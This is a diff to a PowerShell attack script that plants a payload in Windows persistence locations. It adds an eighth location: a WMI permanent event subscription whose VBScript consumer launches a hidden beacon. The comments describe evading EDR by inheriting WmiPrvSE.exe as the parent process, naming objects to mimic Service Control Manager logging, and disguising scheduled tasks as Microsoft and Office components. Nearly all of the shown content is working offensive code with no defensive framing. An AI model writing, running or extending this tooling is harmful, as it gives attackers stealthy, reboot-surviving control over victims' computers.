@@ -8,7 +8,7 @@
 # make this one in tricky spots."
 # =============================================================================
 
-# THIS SCRIPT PLANTS A PAYLOAD IN 7 DIFFERENT PERSISTENCE LOCATIONS ON THE DEVICE
+# THIS SCRIPT PLANTS A PAYLOAD IN 8 DIFFERENT PERSISTENCE LOCATIONS ON THE DEVICE
 # Supports both PS1 script payloads and EXE binary payloads (auto-detected by extension).
 
 
@@ -409,13 +409,96 @@ Write-Success "  Payload copy  : $Task7DropPath (hidden)"
 Write-Host ""
 
 # =============================================================================
+# LOCATION 8  -  WMI Permanent Event Subscription (ActiveScriptEventConsumer)
+# -----------------------------------------------------------------------------
+# Three WMI objects in root\subscription form a permanent subscription that
+# survives reboots without touching the registry Run keys or task scheduler:
+#
+#   __IntervalTimerInstruction  (root\cimv2)  -  fires every 30 minutes
+#   __EventFilter               (root\subscription)  -  watches for that timer
+#   ActiveScriptEventConsumer   (root\subscription)  -  VBScript payload
+#   __FilterToConsumerBinding   (root\subscription)  -  wires filter→consumer
+#
+# ActiveScriptEventConsumer is stealthier than CommandLineEventConsumer:
+#   - VBScript executes INSIDE the WMI service host (WmiPrvSE.exe)
+#   - Beacon spawns with WmiPrvSE.exe as its parent process  -  indistinguishable
+#     from normal WMI provider activity in process trees and EDR parent-chain views
+#   - No powershell.exe appears in the WMI event log at trigger time
+#
+# Object names mimic SCM (Service Control Manager) event logging infrastructure.
+# =============================================================================
+
+Write-Info "[8/8] Planting WMI permanent event subscription (ActiveScriptEventConsumer, every 30 min) ..."
+
+$WMI8DropPath     = if ($IsExe) { "$DropDir\scm-eventlog-svc.exe"  } else { "$DropDir\scm-eventlog-svc.ps1"  }
+$WMI8TimerName    = "SCMEventLog_HB30"
+$WMI8FilterName   = "SCMEventLogFilter"
+$WMI8ConsumerName = "SCMEventLogConsumer"
+$WMI8Namespace    = "root\subscription"
+$WMI8TimerNS      = "root\cimv2"
+
+Copy-Item -Path $PayloadPath -Destination $WMI8DropPath -Force
+$f8 = Get-Item $WMI8DropPath -Force; $f8.Attributes = $f8.Attributes -bor [System.IO.FileAttributes]::Hidden
+
+# 30-minute interval timer in root\cimv2 (shared namespace, looks like a WMI monitor)
+Set-WmiInstance -Namespace $WMI8TimerNS -Class __IntervalTimerInstruction -Arguments @{
+    TimerId               = $WMI8TimerName
+    IntervalBetweenEvents = [UInt32]1800000   # 30 min in milliseconds
+} -ErrorAction SilentlyContinue | Out-Null
+
+# WQL filter listens for that specific timer ID  -  no real OS object is polled
+$WMI8FilterQuery = "SELECT * FROM __TimerEvent WHERE TimerID = '$WMI8TimerName'"
+
+# VBScript: WScript.Shell.Run spawns the beacon; window style 0 = fully hidden
+# The process inherits WmiPrvSE.exe as parent  -  blends into normal WMI traffic
+$WMI8Encoded = if (-not $IsExe) { Get-EncodedCommand -ScriptPath $WMI8DropPath } else { $null }
+if ($IsExe) {
+    $WMI8Script = "Set oShell = CreateObject(""WScript.Shell"") : oShell.Run """"""$WMI8DropPath"""""", 0, False"
+} else {
+    $WMI8Script = "Set oShell = CreateObject(""WScript.Shell"") : oShell.Run ""powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $WMI8Encoded"", 0, False"
+}
+
+# Clean up any previous installation before re-creating
+Get-WmiObject -Namespace $WMI8Namespace -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+    Where-Object { $_.Filter -like "*$WMI8FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
+Get-WmiObject -Namespace $WMI8Namespace -Class __EventFilter -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -eq $WMI8FilterName } | Remove-WmiObject -ErrorAction SilentlyContinue
+Get-WmiObject -Namespace $WMI8Namespace -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -eq $WMI8ConsumerName } | Remove-WmiObject -ErrorAction SilentlyContinue
+
+$WMI8Filter = Set-WmiInstance -Namespace $WMI8Namespace -Class __EventFilter -Arguments @{
+    Name           = $WMI8FilterName
+    EventNameSpace = $WMI8TimerNS
+    QueryLanguage  = "WQL"
+    Query          = $WMI8FilterQuery
+} -ErrorAction Stop
+
+$WMI8Consumer = Set-WmiInstance -Namespace $WMI8Namespace -Class ActiveScriptEventConsumer -Arguments @{
+    Name            = $WMI8ConsumerName
+    ScriptingEngine = "VBScript"
+    ScriptText      = $WMI8Script
+    KillTimeout     = [UInt32]0
+} -ErrorAction Stop
+
+Set-WmiInstance -Namespace $WMI8Namespace -Class __FilterToConsumerBinding -Arguments @{
+    Filter   = $WMI8Filter
+    Consumer = $WMI8Consumer
+} -ErrorAction Stop | Out-Null
+
+Write-Success "  WMI Timer    : $WMI8TimerNS :: __IntervalTimerInstruction  TimerId=$WMI8TimerName"
+Write-Success "  WMI Filter   : $WMI8Namespace :: __EventFilter  Name=$WMI8FilterName"
+Write-Success "  WMI Consumer : $WMI8Namespace :: ActiveScriptEventConsumer  Name=$WMI8ConsumerName"
+Write-Success "  Payload copy : $WMI8DropPath (hidden)"
+Write-Host ""
+
+# =============================================================================
 # Summary
 # =============================================================================
 Write-Warn  "================================================================"
 Write-Warn  " PERSISTENCE INJECTION COMPLETE"
 Write-Warn  "================================================================"
 Write-Host ""
-Write-Host "  Payload planted in 7 startup persistence locations:" -ForegroundColor Yellow
+Write-Host "  Payload planted in 8 startup persistence locations:" -ForegroundColor Yellow
 Write-Host ""
 Write-Host "  [1] HKLM Run Key          (fires at every user logon)"              -ForegroundColor Red
 Write-Host "      HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -439,6 +522,11 @@ Write-Host "      \Microsoft\Windows\UpdateOrchestrator\MusNotifyIconHandler"
 Write-Host ""
 Write-Host "  [7] Scheduled Task        (every 30 min, mimics Office background)" -ForegroundColor Red
 Write-Host "      \Microsoft\Windows\OfficeData\OfficeBackgroundTaskHandlerRegistration"
+Write-Host ""
+Write-Host "  [8] WMI Event Subscription (every 30 min, VBScript in WmiPrvSE.exe)" -ForegroundColor Red
+Write-Host "      root\subscription :: SCMEventLogFilter / SCMEventLogConsumer"
+Write-Host "      root\cimv2        :: __IntervalTimerInstruction SCMEventLog_HB30"
+Write-Host "      Beacon parent process: WmiPrvSE.exe  (invisible to task/service views)"
 Write-Host ""
 Write-Host "  All payload copies hidden in:" -ForegroundColor Yellow
 Write-Host "  $DropDir"
